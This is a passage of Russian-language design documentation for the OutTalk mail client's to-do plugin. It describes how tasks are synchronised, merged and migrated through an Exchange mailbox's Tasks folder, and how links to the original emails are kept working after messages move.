  2. прочитан документ; нечитаемый — сразу перечитываем один раз. Опись новее нас (newer) — error = 'Задачи в ящике записаны более новой версией приложения. Обновите приложение', выход, ничего не пишем и не лечим. Иначе снова нечитаемый — счётчик unreadableRuns растёт, error = 'Задачи в ящике не читаются', выход без записи и повтор через HEAL_AFTER_MS = 2 мин; лечение (см. ниже) — только если опись понятная, а части не собрались (torn), неудача уже вторая подряд и с первой прошло не меньше двух минут;
  3. слияние трёх снимков; если в прочитанной описи нет нашей последней записи (seen[я] ≠ mine) — слияние без удалений с чужой стороны (см. ниже); изменилось — TodoStore.commit(snapshot, expectedRevision), и если пока ходили в сеть кто-то записал, обмен просто повторится (это не ошибка и не исключение — иначе каждый такой случай выглядел бы в журнале поломкой);
  4. собран документ; в ящике уже то же самое (sameSnapshot) — не пишем, двигаем базу на прочитанное;
  5. якорь перепроверяется, затем пишутся части под новым поколением, опись сверяется с прочитанной, пишется опись и убираются старые части;
  6. документ перечитывается, и база двигается через settle: на подтверждённый документ — только если это наша опись (поколение совпало), иначе на прочитанное перед слиянием; mine = поколение нашей записи в обоих случаях. Сдвинуть базу на «то, что записали» — тихая ошибка: лёгший сверху чужой документ превратил бы наши же записи в «удалённые относительно базы». Сдвинуть её на чужой подтверждённый документ — ошибка зеркальная и опаснее: в нём есть чужие задачи, которых у нас нет, и следующий обмен счёл бы их удалёнными нами и стёр бы на всех устройствах; seen от этого не спасает — он защищает от удалений с чужой стороны, а не от своих. Дефект был и до v2, но уборка частей между записью описи и подтверждением расширила окно (ADR-0115, п. 8).

Одновременная запись двух устройств (ADR-0115). Поколения исключают перемешанные части, но не всё: опись одной машины может лечь поверх полной записи другой, не прочитав её (сверка перед описью сжимает это окно до одного запроса, но не закрывает — сервер не умеет «записать, только если не изменилось», а у UpdateUserConfiguration нет условия по ChangeKey). Тогда вторая машина увидела бы документ без своих задач, а в базе — с ними, и по трёхстороннему правилу сочла бы их удалёнными на другом устройстве. Против этого — пара seen/mine: если в очередной описи нет нашей записи (seen[deps.device] !== mine), то отсутствие наших задач в документе значит «перекрыли», а не «удалили», и mergeTasks получает blind/blindRelations — тот же режим «глухого» документа, что и у непрочитанных записей (ADR-0111). Свои удаления применяются как обычно. База без mine (записанная до v2) сливает так же осторожно первый же документ v2. Цена названа прямо: такое слияние может один раз вернуть задачу, удалённую на другой машине в то же окно, — лишняя задача лучше пропавшей.

Пропавший документ не развязывает задачи (ADR-0115 п. 12). Пустой ящик при живой базе — это пропавший документ, а не «все связи развязали». Задачи здесь бережёт нулевой штамп пустого документа, а для связей mergeTasks получает blindRelations: связи из базы не снимаются.

Лечение застрявшего документа. Перенос запускается только при старте и при местных правках, поэтому ждать правки человека нельзя: после неудачного чтения движок сам ставит повтор (retryIn: один таймер; более короткий повтор заменяет более длинный, run() по любой причине снимает отложенный, stop() — тоже). Лечится только понятное: три условия сразу — опись наша (v1 или v2 в пределах MAX_PARTS), а части не собрались (torn); документ не читается два обмена подряд (unreadableRuns ≥ 2), так что одна случайная неудача после сна лечение не запускает; с первой неудачи прошло не меньше HEAL_AFTER_MS. Неразборная опись (могла написать неизвестная версия) и опись новее нас не перезаписываются никогда. Тогда heal() записывает свои задачи как есть, без слияния — слияние с «пустотой» при живой базе стёрло бы задачи везде, — без сверки (сверяться не с чем), убирает части под постоянными именами v1 (все MAX_PARTS), подтверждает запись чтением и сдвигает базу тем же settle (запасной базой служит прежняя база устройства). Опись лечения учитывает только лечащее устройство, поэтому остальные по правилу seen сольют её без удалений и вернут свои задачи в ящик своей же записью. В раскладке v2 документ рваться не умеет, так что лечить на практике приходится наследство v1.

Учётную запись могли переподключить к ДРУГОМУ ящику (ADR-0078). Номер учётной записи при смене принципала сохраняется, а ящик за ним — уже другой. Без памяти письма старого ящика, записанные в задачах под этим номером, выгрузились бы как принадлежащие новому — то есть темы и адреса одного ящика уехали бы в другой. Поэтому рядом лежит com.outtalk.todo.anchor.json — «этот номер в прошлый раз означал вот этот адрес»; адрес сменился — remapAccountIds(accountId, 'ext:<прежний адрес>') возвращает таким письмам имя ИХ ящика, и только после этого идёт обычная замена ext:<адрес якоря> на местный номер. Память обновляется, когда пара «номер ↔ адрес» изменилась.

Новое в TodoStore: quarantined(): number — сколько записей отложено при последнем чтении (ADR-0112; перечитывает файл, поэтому зовётся перед каждым обменом), onWrite(listener) (возвращает отписку; с ADR-0123 слушатель получает { removed } — номера задач, убранных жестом человека, а commit и карантин туда ничего не кладут), commit(snapshot, expectedRevision) — тихий отказ вместо исключения restore (отмену отменяет человек, ему говорят словами; слияние просто сливается заново), remapAccountIds(from, to). Пределы и валидаторы (validItem, validRelation, MAX_ITEMS, MAX_RELATIONS, MAX_NOTE, …) стали экспортируемыми: приехавший документ проходит те же проверки, что и локальный файл.

Надстройка (todo-overlay.ts)

Здесь «надстройка» — наш JSON поверх родных полей задачи, а не надстройка Outlook (Exchange: надстройки Outlook).

Лежит в именованном свойстве OutTalk.Task; провайдер хранит её как непрозрачную строку, толкует только этот модуль.

interface OverlayWire {
  v: 1; id: string; at: string          // версия, наш id, время нашей последней правки
  n: {                                  // ТЕНЬ — родные поля, как МЫ их записали
    subject?: string; due?: string | null; status?: MailTaskStatus; imp?: MailTaskImportance
    body?: string | null                // sha-256 нормализованной заметки (hex)
    prev?: MailTaskStatus               // статус до нашей отметки «выполнено» — для повторного открытия
  }
  title?: string                        // полное название, если не влезло в Subject (255)
  urgent?: true                         // «срочно» поверх Importance = High
  assignee?, reporter?: PortablePerson; participants?: PortablePerson[]
  subtasks?: PortableSubtask[]; messages?: PortableSource[]; links?: PortableLink[]
  noteStamps?: string[]                 // дата каждой строки заметки
  rel?: Array<{ b: string; createdAt: string }>   // связи: хранятся у задачи a при a < b
  mig?: string                          // метка переезда (этап 3)
}
  • Перевод один. Люди, письма, ссылки и пункты переводятся теми же функциями, что и скрытый документ: toPortablePerson/fromPortablePerson, toPortableSource/fromPortableSource, toPortableLink/fromPortableLink, toPortableSubtask/fromPortableSubtask из todo-sync.ts. Ящик назван адресом; ящик, которому здесь нет имени, в надстройку не едет (dropped).
  • Сборка: больше 192 КиБ в UTF-8 — отказ, без тихой обрезки.
  • Разбор — как недоверенного ввода. Длина проверяется до JSON.parse. Не JSON, не объект, v не целое ≥ 1, негодный id — надстройки нет. Остальное — поштучно: кривое поле (и кривой элемент списка) выбрасывается и считается в rejected, незнакомые поля отбрасываются, списки читаются не дальше предела хранилища, повторы по ключу личности выкидываются. Даты строк годны только целиком: частичный список к строкам не привязать.
  • v больше нашего — поля показываются, насколько понятны, newer: true, и надстройка не перезаписывается (замок newer).

Соответствие полей (todo-native.ts)

viewOfTask(task, ctx) строит из MailTask задачу кадра и то, что нужно для следующей записи (TaskView: родные значения, замок, что можно писать, связи, штамп).

  • id. Годный OutTalk.TaskId; иначе выведенный x- + 22 символа base64url(sha-256(адрес ящика в нижнем регистре + \0 + ItemId)). Надстройка другого id — «надстройки нет»; надстройка, которая есть, но не разобралась, — overlayUnknown: её молчание о людях и письмах не считается удалением.
  • Тень. Родное значение, отличное от тени, правили снаружи, и оно побеждает: сменили Subject — title из надстройки не применяется; сменили важность — не применяется urgent; сменилось тело — даты строк выравниваются по тексту с прежней версией из зеркала (совпавшим строкам дата сохраняется, новым — LastModifiedTime).
  • Важность: low↔low, normal↔нет поля, high↔high; urgent пишется как High плюс urgent в надстройке и читается обратно, только если тень помнит High.
  • Статус: completed ↔ Status = Completed. Повторное открытие возвращает n.prev, иначе n.status, если он не completed, иначе notStarted; незавершённый статус (inProgress, waitingOnOthers…) правка других полей не трогает.
  • Тема длиннее 255 — в Subject обрезанная, полное название — в title надстройки. Пустая тема показывается как «Без названия» и сама по себе не пишется.
  • Заметка: \r\n → \n, управляющие символы убираются. Обрезанная сервером, пришедшая не текстом, длиннее 4000 символов или 400 строк — показывается обрезанной и только для чтения: в правку не идёт никогда, а местная правка возвращается к серверной.
  • Напоминание ↔ reminder; снятое — reminder: null. Категории — только чтение, цвет из taskCategories(), в правку не идут.
  • Замки (lock): recurring — не пишется ничего; assigned — только надстройка и TaskId; newer (в том числе overlayState: 'oversize') — только родные поля. Что писать нельзя, planPatch возвращает в effective к серверному, и движок кладёт это в хранилище.

planPatch({ local, base, rel, mailboxOf, now }) — разница местной задачи с серверной версией → Partial<MailTaskFields> только с изменившимися полями. Надстройка пишется, когда изменилось её содержимое или родные поля (тень должна совпасть с записанным), а у задачи из Outlook — при первой нашей правке, вместе с TaskId. Чтение само по себе не пишет ничего. viewAfterWrite даёт новую базу без перечитывания; своё эхо движок узнаёт по ChangeKey.

Слияние (todo-task-merge.ts)

mergeTask({ base, local, remote, localStamp, remoteStamp, now }) — чистая функция. Скаляры (title, completed с completedAt, dueDate, priority, assignee, reporter, reminder): изменила одна сторона — берём её; обе — побеждает более поздний штамп (местный updatedAt против LastModifiedTime, оба поджаты MAX_CLOCK_SKEW_MS), при равенстве — сервер. Заметка — mergeNote по строкам. Письма, ссылки, участники, пункты и refs пунктов — mergeCollection по ключу личности минус убранное относительно базы; содержимое пункта, правленного с обеих сторон, — по штампу. Порядок пунктов — orderSteps (ADR-0134): переставила одна сторона (взаимный порядок общих с базой пунктов другой, чем в базе) — её порядок, обе — порядок более позднего штампа, при равенстве — сервер; пункты, добавленные на другой стороне, встают по своему месту в своём списке (конец — в конец, начало — в начало, середина — за соседом сверху); итог — ровно набор mergeCollection, без потерь и двойников. Только для чтения (createdAt, categories, lock) — от сервера, home — местный. Заметка сервера только для чтения остаётся серверной; при overlayUnknown коллекции и люди только объединяются. mergeRelations — то же правило для связей задачи.

Движок и зеркало (todo-tasks-runner.ts)

createTasksRunner(store, deps) — один ящик; createMailboxTasks(store, deps) — все ящики, у провайдера которых есть syncTasks. К провайдеру — только через traced(accountId); noteOwnMutation не вызывается.

Зеркало — plugin-data/com.outtalk.todo.mirror.<sha1(адрес)>.json, запись атомарная: syncState, folderId, complete (последнее полное чтение дочитано), по задачам — id, itemId, changeKey, createdAt, base (серверная версия в переносимом виде: ящики названы адресом), dirty, а также unreadable, hidden (не поместилась в предел хранилища), waiting (концы связей, которых ещё нет); очередь creates/deletes и retry — новые элементы, которые сервер не отдал. Зеркало другого ящика или испорченное — начинаем с нуля: первое чтение сопоставит задачи по id, а отправка до этого чтения не начнётся.

pull():

  1. syncTasks, пока more (не больше 1000 страниц; вышли по пределу — список считается неполным); reset — начинаем копить страницы заново; элементы из unreadable и прежние недочитанные перечитываются getTasks по одному.

  4. Изменённая на сервере задача с неотправленной местной правкой — mergeTask; без правки — серверная версия. Удалённая у нас, но изменённая на сервере — возвращается.
  5. Удаление: из deleted, а при полном перечитывании — отсутствие, только если оно дочитано до конца (complete). Удалённая на сервере задача с неотправленной правкой — в очередь создания с тем же id.
  6. Связи задач этого ящика собираются заново из надстроек — одним правилом settleRelations (база, местные, серверные → связи в хранилище и waiting), тем же при чтении, при слиянии после отказа, при возвращении задачи после отказа в удалении и при сопоставлении потерянного создания: объединение минус развязанное относительно базы; конец связи, которого ещё нет в хранилище, ждёт в waiting (другой ящик не дочитан или не подключён) и довешивается reapplyRelations(), когда появится. По одному отсутствию такая связь не снимается никогда: второй конец может быть местной задачей другого устройства, у которой ящика нет вовсе. Развязывает только наблюдаемое событие — человек развязал задачи или удалил вторую, и это видно в хранилище.
  7. Всё это синхронно, одним снимком: между чтением хранилища и записью ничего не вклинивается.

Предохранители удаления. Удаление на сервере — удаление на всех устройствах, поэтому движок не выводит его из того, что может быть просто непрочитанным:

  • записи в карантине хранилища (ADR-0112) в снимок не попадают и выглядели бы удалёнными — пока карантин не пуст, ящик не читается и не пишется, как и у прежнего переноса;
  • удаление — только событие записи хранилища. TodoStore.write() знает номера того чтения, на котором стоит операция, и номера, которые пишет; убранное жестом человека (удаление, объединение — поглощённые задачи, отмена) он передаёт слушателям onWrite как { removed }. Слияние (commit — перенос между устройствами и сам движок) и карантин туда ничего не кладут. Движок ставит в очередь удаления только эти номера. Сравнение двух чтений источником удаления не служит: файл задач могут удалить или подменить старой копией снаружи — облачная синхронизация, резервная копия, сам человек, — в том числе посреди сеанса. Задача, которую помнит зеркало, а в хранилище её нет без такого события, возвращается из зеркала, как на сервере;
  • удаление, сделанное, пока уходила правка той же задачи, получает версию после нашей записи: иначе сервер отверг бы его как столкновение, и задача вернулась бы;
  • отказ в удалении (conflict/invalid) сначала кладёт элемент в retry и только потом перечитывает: сбой сети в этот момент не прячет задачу до полного перечитывания.

Чужие задачи (ADR-0136, этап A2). Если с ящиком работают несколько человек, провайдер отдаёт движку только задачи вошедшего, а изменённые задачи другого человека называет номером в MailTaskChanges.foreign (Модель провайдеров → Чьи задачи). Движок их не видит и не трогает:

  • при сборе страниц номер из foreign вытесняет тот же номер из changed/deleted/unreadable и наоборот — побеждает последнее, что сказал сервер;
  • номера из foreign считаются «увиденными» в полном перечитывании: отсутствие чужой задачи в нашем виде — не удаление;
  • задача, которая была нашей и стала чужой (метку владельца поставил другой человек), снимается из вида и зеркала без удаления на сервере и без «создать заново»; её номер уходит и из очереди удалений;
  • если задача стала чужой между чтением и записью, провайдер откажет в правке или удалении кодом forbidden ещё до записи. Отдельной ветки для этого кода у движка нет: как и прочий непредвиденный сбой, он оставляет очередь на месте до повтора, а следующее чтение назовёт задачу в foreign и снимет её из вида, зеркала и очереди.

Правило «удаление только из события записи хранилища» (ADR-0123) не тронуто: исчезновение чужой задачи из выборки — не жест человека, в onWrite как { removed } оно не попадает, и deleteTask по нему не зовётся. Покрытие — todo-tasks-owner.test.ts.

После каждого сетевого ожидания движок проверяет, не остановлен ли он (ящик отключили или заменили), и тогда в хранилище не пишет.

push() (ящик ещё ни разу не прочитан — сначала pull()): reconcile() сверяет хранилище с зеркалом (правка → dirty, новая задача с home этого ящика → creates, пропавшая → deletes; то, что писать нельзя, сразу возвращается к серверному; удалить поручение или повторяющуюся нельзя — задача возвращается). Затем:

  • удаления — deleteTask(itemId, changeKey); conflict (правили снаружи) или invalid — правка выигрывает, задача возвращается из getTasks; not_found — уже удалена;
  • создания — createTask; если прошлая попытка могла дойти, а ответ потерялся (attempted), сначала findTasksByTaskId, чтобы не завести дубль. Если же элемент с этим id раньше принесло чтение, создание сопоставляется с ним и снимается из очереди; вторую запись зеркала с тем же id или ItemId движок не заводит никогда, а перед записью в хранилище проверяет, что id не повторяются;
  • правки — updateTask(itemId, changeKey, patch); conflict → getTasks → mergeTask → запись в хранилище → повтор, не больше трёх кругов, дальше отложенный повтор через 30 секунд; not_found — создаётся заново с тем же id.

Сбой сети оставляет всё в очереди (status().pending), движок ставит повтор через 30 секунд. В main: отправка по onWrite со склейкой 2 секунды; чтение — по событию подписки на ящик (folderChanged, этап 4, см. ниже), при старте, раз в 5 минут, при пробуждении и при открытии раздела. Своя запись движка в хранилище отправку не будит.

Решения, о которых ADR молчал: тень хранит ещё prev — статус до нашей отметки «выполнено» (одной status для повторного открытия мало); пустая тема показывается «Без названия»; тело длиннее местного предела заметки (4000 символов / 400 строк) — тоже «только для чтения»; надстройка не того id — «надстройки нет», а не «чужая, не трогать»; копия с тем же TaskId сохраняет содержимое надстройки под своим выведенным id; задача сверх предела хранилища остаётся в зеркале (hidden) и показывается, когда место освободится; тема длиннее 500 символов, записанная другим клиентом, обрезается, а не выбрасывает задачу; связь со вторым концом, которого здесь нет, ждёт бессрочно; home при слиянии берётся от серверной версии, то есть от движка ящика.

Хранение, ящик задачи и переезд (todo-storage.ts, этап 3)

createTodoStorage(store, deps) заводит движки ящиков (createMailboxTasks) только для ящиков в режиме «в ящике» (deps.modeOf(accountId), ADR-0136; прежний deps.mode() — один режим на все — остался для тестов этапа 3) и гасит движок ящика при переключении его на «Только на этом компьютере» (reconfigure() зовётся из plugin:setTodoStorage): ящику в местном режиме движок просто не получает провайдера. Обратное переключение: задачи, уже лежащие в ящике, там и остаются, местная копия сохраняет home и замки; удаление в местном режиме без сети ставится в очередь удаления зеркала своего ящика (queueOfflineDeletes, слушатель onWrite хранения — для каждого ящика без работающего движка), поэтому при включении ящика задача не воскресает, а удаление доходит до сервера; правки, сделанные в местном режиме, уходят при включении обычной разницей с базой. Подпись настройки говорит это человеку. Ящики, умеющие задачи, — подключённые ящики, у провайдера которых есть syncTasks; в демо-режиме без учётных записей это демо-ящик demo (demo@company.com), так что хранение в ящике работает и в OUTTALK_DEMO. Второй демо-ящик (demo-2, OUTTALK_DEMO_ACCOUNTS=2) — тоже ящик задач, но его провайдер методов задач не объявляет (DemoMailbox.tasks: false): папка «Задачи» у демо-ящиков общая, и задачи одного иначе появлялись бы в другом; его задачи хранятся только здесь. Существующие E2E-сценарии со списком задач запускаются с OUTTALK_TASKS_MAILBOX=0: их снимки рассчитаны на список без задач демо-папки.

Ящик есть у каждой задачи (ADR-0136) — и у той, что хранится только на этом компьютере. Хранится ли задача в папке «Задачи», решает не наличие home, а её ящик: умеет ли он задачи и в каком он режиме (homeFor(accountId) — «да, в его папке»). Без ящика остаётся только задача, чьё первое письмо из ящика, который здесь не подключён (todo.pendingHome).

Ящик новой задачи. Из письма, человека или встречи — ящик объекта (любого: у IMAP-ящика задача просто хранится только здесь). Рукописная (todo.add) — ящик, выбранный в программе (ctx.scopeAccount()), без вопроса «в какой ящик?»; аргумент home кадра больше не читается. Объект чужого плагина — тоже выбранный ящик. Разделение — ящик исходной (п. 8). Письмо, легшее само (ADR-0093), и «Добавить в задачи» по переписке идут только в задачу того же ящика (или в старую задачу без ящика). Между ящиками ничего не кладётся: «Добавить к задаче…» для письма, человека или встречи ящика A показывает только задачи ящика A и отказывает задаче другого ящика (sameMailbox: «Эта задача — из другого почтового ящика»), объект чужого плагина — только в задачу выбранного ящика; связи, перенос вложения и объединение — только внутри ящика раздела.

resolveHome(item, ctx, selected?) — чистая функция, по порядку: 1) home уже есть; 2) ящик самого раннего письма (без писем — первого человека или встречи), если он подключён — умеет он задачи или нет; не подключён (ext:<адрес> или удалённый номер) — «ждёт ящик» (unconnected, с адресом, если он известен); 3) единственный ящик, хранящий задачи в папке «Задачи» (так шёл переезд ADR-0123), или единственный подключённый ящик; 4) ящик, выбранный в окне (selected) — старые рукописные задачи достаются ему один раз, как прежние общие подпись и настройки; 5) выбор ещё не объявлен — wait, подождать. Причины choose больше нет.

Переезд (п. 10 в редакции владельца — без моста). Каждый обмен sync(): движки ящиков читают и отправляют своё; затем для каждого ящика без метки migration.done в его зеркале:

  1. Старый документ выводится из работы — retireLegacy → createTodoSync(...).retire({ read }). read — только если это устройство с документом работало (прежняя настройка sync была on и база этого ящика лежит здесь): тогда документ читается и вливается последний раз тем же обменом, что и всегда (база, осторожные режимы, карантин), но без записи; задачи, приехавшие через документ до отметки, не теряются. Затем вместо описи пишется отметка {"kind":"tasks","v":3,"moved":"tasksFolder"} (MOVED_MANIFEST). Отметка пишется и в ящик, с которым здесь переноса не было, — чтобы старая версия на другой машине не завела там документ заново. Если последнее чтение не влилось (кто-то записал в файл задач в ту же секунду, или в хранилище карантин ADR-0112), retire бросает исключение и отметку не пишет — ящик ждёт следующего круга; только порванный документ отметке не мешает. Уже стоящая отметка — already, второй раз не пишется; опись более новой версии, но не отметка — newer, не трогается. Части документа не удаляются — это уборка следующего этапа. Сбой сети — ящик ждёт следующего круга, строка состояния говорит «Переезд задач в ящик ещё не закончен…».
  2. Ящики раздаются местным задачам по resolveHome — в ящик с движком только после шага 1: последнее чтение документа, пришедшее позже, могло бы снять с задачи её ящик; в ящик без движка (местный режим, IMAP) — сразу, задача остаётся здесь, только с ящиком. Вне обмена раздача идёт по объявлению выбранного ящика (placeHomeless(selected), ADR-0136) — только в ящики без движка; в ящик с движком задачу кладёт ближайший обмен, после чтения ящика. Вызовы кадра и чтение сводки ничего не раздают. Задачи, получившие ящик в местном режиме, движок ящика сам в очередь создания не ставит, пока в зеркале нет метки переезда (holdUntilMigrated); в шаге 3 migrate() отдаёт их adopt — тем же путём, что переезжающие (поиск по TaskId, метка mig). Запись одним store.commit, затем runner.adopt(ids) ставит их в очередь создания с пометкой «сначала поискать» (attempted) и меткой mig (метка устройства и время) для надстройки: если другое устройство уже создало задачу с этим TaskId, она сопоставляется — найденная версия сливается с местной копией по полям (mergeTask без базы), а не перезаписывается ею. Поиск закрывает не всё окно (переезд длится минуты), поэтому чтение сворачиваются только дубли гонки: элементы с одним TaskId, у обоих mig, метки устройств в mig разные (копия, сделанная в Outlook, несёт метку оригинала и под правило не попадает), оба созданы не дальше часа друг от друга и каждый — не дальше часа от времени своей метки, лишний с создания не правили (нет неотправленного — ни помеченного, ни местной правки, ещё ждущей склейки отправки; изменён на сервере не позже 5 с после создания) и содержимое совпадает целиком — родные поля и надстройка, кроме метки и времени записи. Тогда лишний уходит в «Удалённые» условным удалением, остаётся самый ранний. Если содержимое разное (на одной машине задачу правили без сети), остаются обе копии, как в п. 5: слить их без человека значило бы выбрать за него, а удалить — потерять правку. Сливать не стали сознательно: равенство проверяется дёшево и не теряет ничего, а слияние без базы решало бы по штампам часов разных машин. Метка mig пишется только при создании и снимается нашей первой записью после переезда (planPatch переносит mig в надстройку только у создания). Правило проверяет raceTwin в apply(), содержимое сравнивает fingerprint.
  3. Метка migration: { done: true } в зеркале ящика. Сбой между шагами безопасен: отметка в документе уже стоит (already), раздача ящиков повторяема, очередь создания движка переживает перезапуск и потерянный ответ.

Отметка перепроверяется один раз за сеанс и в ящике с done: старая версия могла в окне между своей проверкой описи и записью положить опись поверх отметки — тогда её документ читается ещё раз и отметка ставится снова. Раздача ящиков (шаг 2) идёт и после переезда — на каждом обмене: задачи, заведённые в режиме «только здесь», переезжают, когда режим включили; задача из неподключённого ящика — когда его подключили.

Старые версии. Версии с ADR-0115 читают отметку как опись более новой версии (isNewerManifest: v > 2) — «Задачи в ящике записаны более новой версией приложения. Обновите приложение» — и ничего не пишут ни обменом, ни правкой. Версии до ADR-0115 не понимают её вовсе («Задачи в ящике не читаются») и тоже не пишут. Их местные задачи остаются у них и переедут после обновления. Сам движок старого документа в новой версии живёт только ради retire: якорь у него есть лишь на время этого шага, порт без remove.

Замки соблюдает хранилище (assertTodoEditable, см. Доменная модель): отказ приходит раньше записи, а движок по-прежнему возвращает к серверному всё, что в файл попало мимо них (отмена, подменённый файл).

Раздел видит только выбранный ящик (ADR-0136, этап A1)

«Программа должна подстраиваться под тот ящик, который сейчас выбран»: раздел «Задачи» и все вызовы todo.* из него видят и правят только задачи ящика раздела.

  • Ящик подставляет main, а не кадр. BuiltinContext.scopeAccount() (ipc/plugins.ts, scopeFor(sender)): у вынесенного окна раздела — ящик, закреплённый за ним при открытии (ADR-0104); у главного окна — выбранный в нём. Главное окно объявляет выбор односторонней посылкой window:setActiveAccount (как раздел, ADR-0100); main держит одну строку на процесс (windows/active-account.ts), принимает её только от главного окна и только для известного ящика, забывает при закрытии окна. До первого объявления — первый подключённый ящик (так же выбирает и окно). Кадр не называет ящик ни в одном вызове.
  • Фильтр в обработчике (builtin/todo.ts): todo.list, todo.relations, todo.graph отдают только задачи ящика раздела (и связи, у которых оба конца в нём); каждый вызов по id задачи (update, remove, relate, merge, split, moveAttachment, пункты, люди, ссылки, «открыть письмо/беседу/контакт/встречу/объект») проверяет её ящик — чужая задача отвечает «Задача не найдена», как несуществующая. Живые обновления (этап 4)

Правка задачи в Outlook или на другом компьютере появляется за несколько секунд, а не через пятиминутный обмен.

Путь события.

  1. Подписка на весь ящик (ADR-0063) уже приносит события по «Задачам»: Created, Modified, Moved, Deleted элементов папки (живой зонд: 0,7–5 с после правки). classifyWatchEvents складывает их в onChanged(folderIds): ParentFolderId — «Задачи» при создании и правке, OldParentFolderId — при уходе в «Удалённые».
  2. surfaceChanged в watch/watcher.ts объявляет announceFolderChanged(accountId, folderIds) (main/mail-arrivals.ts, по образцу announceNewMail, ADR-0093) — до фильтра своего эха OWN_ECHO_MS. Тот фильтр знает только записи почтового слоя (noteOwnMutation); под ним отметка «прочитано» на 8 секунд задерживала бы и правки задач из Outlook (с ADR-0143 фильтр удерживает только папки своей записи и потом выдаёт изменения, но шине задач и так не нужен). Событие от снятого наблюдения не объявляется. Объявление не ждёт и не бросает (setImmediate).
  3. Подписчик — setFolderChangedSink в ipc/plugins.ts → TodoStorage.folderChanged(accountId, folderIds). В режиме «Только на этом компьютере» и после stop() — ничего; иначе событие идёт в createMailboxTasks().folderChanged и только в уже работающий движок этого ящика.
  4. TasksRunner.folderChanged(folderIds) узнаёт папку по folderId зеркала; пока его нет — спрашивает provider.tasksFolderId() (у Exchange — один GetFolder за жизнь провайдера) и запоминает ответ, в том числе «папки нет»: иначе каждое событие ящика стоило бы GetFolder. Чужие папки — мимо.
  5. Склейка: PULL_DEBOUNCE_MS = 1500 от последнего события, но не дольше PULL_MAX_WAIT_MS = 5000 от первого события серии. Затем живое чтение doPull() идёт той же очередью serial, что и обмен по таймеру: два чтения одного ящика одновременно не бывает. Событие посреди идущего чтения ставит одно чтение следом (флаг pullQueued), а не по чтению на событие. После живого чтения onPulled довешивает связи других ящиков, ждавшие задач этого (reapplyRelations).

Ссылка на письмо переживает переезд (ADR-0074)

Задача из письма хранит указатель на это письмо, а source.messageId — это provider item id, то есть адрес, а не личность: Exchange выдаёт письму новый ItemId, как только оно меняет папку. Отсюда баг: «добавил письмо в задачи → убрал письмо в Архив → задача больше не открывает письмо». То же ломало ссылку при удалении (переезд в «Удалённые»), при серверном правиле и при перекладке из Outlook/OWA. Устойчивый идентификатор — Message-ID из RFC 5322 (TodoMessageSource.internetMessageId, Доменная модель); контракт провайдера — readInternetMessageId?/findByInternetMessageId? (Модель провайдеров).

Разделение ответственности жёсткое: плагин не знает про EWS, почтовый слой не знает про ToDo.

МодульРоль
main/message-refs.tsпровайдер-агностичное разрешение ссылки: resolveMessageReference(source, deps) → { messageId, repoint? }; locateFolderScope(folders) — порядок папок для поиска (archive → inbox → deleted → sent → junk → пользовательские → drafts/outbox); шина переходов previousId → id: setSavedMessageRefRemap(fn) ставит починку, remapSavedMessageRefs(accountId, moves) её зовёт

Почему main/message-refs.ts, а не plugins/… и не ipc/…. Обе стороны починки живут на разных концах приложения: переходы previousId → id узнаёт почтовый слой (ipc/mail.ts), а держит сохранённые указатели слой плагинов (TodoStore). Положить модуль под plugins/ значило бы заставить почту импортировать плагины; положить под ipc/ — сделать вид, что это канал, хотя ни одного IPC-обработчика он не регистрирует. Модуль не трогает ни одного EWS-типа, поэтому Gmail/IMAP-бэкенд встанет в тот же поток, а «закреплённое письмо» или заметка — в того же потребителя.

Три пути, каждый закрывает свой класс случаев:

  1. Личность записывается при добавлении письма. todo.addFromMessage и todo.attachToTask (ADR-0079; общий withIdentity в обработчике) — единственные точки, где письмо заведомо там, где его видит человек. Чтение best-effort: задача дороже указателя, поэтому бэкенд без readInternetMessageId или сиюминутный сбой чтения не отменяют клик — письмо сохраняется без личности и попадёт в дозапись.
  2. Точный ремонт при перемещении. mail:move уже держит previousId → id по каждому подтверждённому перемещению и объявляет их через remapSavedMessageRefs(accountId, moves); TodoStore.remapMessageIds переписывает messageId у задач этого ящика. Объявляются только строки со статусом moved — у отказавшего перемещения нового id нет, и «починить» по нему значило бы сломать живую ссылку. Две сознательные детали:
    • Работа уходит с горячего пути (setImmediate). Починка синхронно читает и перезаписывает JSON-хранилище; делать это внутри обработчика mail:move значило бы блокировать main — а с ним интерфейс и streaming-подписку — на каждом перетаскивании пачки писем. Результат в обработчике никому не нужен, поэтому он отвечает renderer'у сразу, а починка идёт следующим тиком.
    • Best-effort, обёрнута в try/catch с logWarn: перемещение, которое попросил пользователь, не может провалиться из-за плагинных данных, а не переехавшая ссылка всё равно восстановима позже через Message-ID.
  3. Устойчивое разрешение при открытии. todo.openMessage для выбранного письма задачи перед ctx.openMessage зовёт resolveMessageReference:
    • читаем личность по сохранённому id → личность та же (или у задачи её ещё не было) → id жив, открываем (и попутно дописываем личность задаче, если её не было);
    • MailError с кодом stale/not_found → ищем письмо по Message-ID → нашли, открываем и записываем новый id обратно, следующее открытие снова бесплатное;
    • id жив, но личность другая → по этому адресу лежит уже не наше письмо (хранилище переиспользовало id, или задача писалась против другого состояния ящика). Обрабатывается ровно как мёртвый id: по адресу не открываем, идём искать своё письмо по Message-ID, а сохранённую личность чужой не перезаписываем — это единственный якорь задачи, и, потеряв его, восстановить ссылку уже нечем. Если поиск вернул тот же самый id, который только что держал чужое письмо, это тоже «не найдено»: открыть его — значит открыть не то;
    • network/auth не выдаются за потерянное письмо — ошибка пробрасывается как есть;
    • искать не по чему (старая задача без личности) либо поиск не нашёл ничего / нашёл больше одного кандидата → «Исходное письмо не найдено: оно удалено или перемещено за пределы поиска.» Неоднозначность решается закрыто.

Миграция старых задач. При первом за запуск приложения вызове todo.list (то есть при первом открытии раздела «Задачи») обработчик запускает фоновый проход по письмам задач без личности (с ADR-0079 — по каждому письму каждой задачи): не больше BACKFILL_LIMIT = 100 писем за проход, по одному узкому GetItem последовательно — почтовый ящик общий ресурс, и результата никто не ждёт. Письмо, которого уже нет, пропускается (stale/not_found — личность взять неоткуда, и повторять нечего). Отказ другого рода (нет сети, нет учётки, аккаунт удалён) — свойство конкретного ящика, а не прохода: этот ящик выбывает целиком вместе со своими оставшимися задачами, а остальные аккаунты дорабатываются до конца. Иначе один удалённый аккаунт парковал бы миграцию навсегда — по одному вызову за заход. Незавершённый проход снимает защёлку (backfilled = false), и следующий заход в раздел пробует снова; сам проход при этом идёт ровно один раз за запуск приложения, пока всё получается. Задача, чьё письмо уехало до обновления, не чинится ничем: личности у неё нет, а гадать по теме/отправителю/дате осознанно отказались.

Что осталось за кадром: снимок subject/from/date в задаче по-прежнему не обновляется после переименования письма на сервере — это снимок, а не зеркало.

Встроенный Jira (com.outtalk.jira, ADR-0060)

